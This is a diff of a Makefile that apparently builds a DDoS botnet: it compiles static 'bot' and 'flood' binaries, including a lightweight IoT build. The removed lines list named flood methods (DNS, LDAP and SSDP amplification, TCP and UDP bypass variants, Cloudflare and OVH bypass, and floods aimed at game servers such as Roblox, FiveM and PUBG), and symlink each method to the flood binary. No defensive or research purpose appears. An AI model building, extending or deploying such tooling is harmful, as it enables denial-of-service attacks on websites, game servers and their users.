@@ -2,37 +2,18 @@
 CXX ?= g++
 CXXFLAGS = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread -static-libstdc++ -static-libgcc
 
-METHODS = dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack \
-          game rainbow rocket roblox fivem pubg fortnite warthunder counter samp \
-          subnet icmp http https httpx rapidflood tls tlsx bypass browser cache cloudflare
-
-all: bot flood http symlinks
+all: bot flood
 
 bot: ../bot.cpp
 	$(CXX) $(CXXFLAGS) -static -o bot ../bot.cpp
-
-http: ../http.cpp
-	$(CXX) $(CXXFLAGS) -static -o http ../http.cpp
-
-https: ../https.cpp
-	ln -sf flood https
 
 flood: ../flood.cpp
 	$(CXX) $(CXXFLAGS) -DNO_SSL -static -o flood ../flood.cpp
 
 # Lightweight IoT build without OpenSSL dependency
-iot-nossl: ../bot.cpp ../flood.cpp ../http.cpp
+iot-nossl: ../bot.cpp ../flood.cpp
 	$(CXX) $(CXXFLAGS) -static -o bot ../bot.cpp
-	$(CXX) $(CXXFLAGS) -static -o http ../http.cpp
 	$(CXX) $(CXXFLAGS) -DNO_SSL -static -o flood ../flood.cpp
-	@for m in $(METHODS); do \
-		ln -sf flood $$m; \
-	done
-
-symlinks: flood
-	@for m in $(METHODS); do \
-		ln -sf flood $$m; \
-	done
 
 clean:
-	rm -f bot http https flood $(METHODS)
+	rm -f bot flood
